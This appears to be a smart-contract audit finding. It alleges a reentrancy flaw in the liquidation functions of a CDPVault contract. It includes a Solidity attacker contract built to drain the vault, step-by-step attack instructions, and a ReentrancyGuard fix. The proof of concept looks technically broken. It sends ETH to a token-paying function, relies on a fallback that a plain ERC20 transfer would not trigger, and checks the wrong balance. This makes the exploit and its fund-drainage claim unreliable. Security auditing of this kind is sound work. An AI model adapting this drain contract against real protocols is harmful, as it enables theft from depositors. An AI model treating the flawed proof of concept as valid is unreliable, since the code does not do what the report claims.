# Vulnerability details

## Impact
- Fund Drainage
- Inconsistent State
- Denial of Service (DoS)
- Economic Exploits

## Proof of Concept
The `token.safeTransfer` calls in the `liquidatePosition` and `liquidatePositionBadDebt` functions occur before the state is updated. This sequence potentially exposes the contract to reentrancy attacks.
1. Deploy the Vulnerable Contract: Deploy the `CDPVault` contract with appropriate parameters.
2. Deploy the Malicious Contract: Deploy the following malicious contract designed to exploit the reentrancy vulnerability:
```
pragma solidity ^0.8.19;

import "./CDPVault.sol"; // Import the vulnerable contract

contract ReentrancyAttack {
    CDPVault public cdpVault;
    address public owner;

    constructor(address _cdpVault) {
        cdpVault = CDPVault(_cdpVault);
        owner = msg.sender;
    }

    // Fallback function to re-enter the vulnerable function
    fallback() external payable {
        if (address(cdpVault).balance >= 1 ether) {
            cdpVault.liquidatePosition(owner, 1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        cdpVault.liquidatePosition{value: msg.value}(owner, 1 ether);
    }

    function withdraw() external {
        payable(owner).transfer(address(this).balance);
    }
}
```
3. Execute the Attack: 
- Fund the `ReentrancyAttack` contract with enough ETH to perform the attack.
- Call the `attack` function on the `ReentrancyAttack` contract.
- The malicious contract will repeatedly call the `liquidatePosition` function, draining the funds from the `CDPVault` contract before the state is properly updated.

## Recommended Mitigation Steps
- Implement OpenZeppelin's ReentrancyGuard to prevent reentrancy attacks.
```
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract CDPVault is AccessControl, Pause, Permission, ICDPVaultBase, ReentrancyGuard {
    // ...
    function liquidatePosition(address owner, uint256 repayAmount) external whenNotPaused nonReentrant {
        // ... (existing code)
    }

    function liquidatePositionBadDebt(address owner, uint256 repayAmount) external whenNotPaused nonReentrant {
        // ... (existing code)
    }
}
```
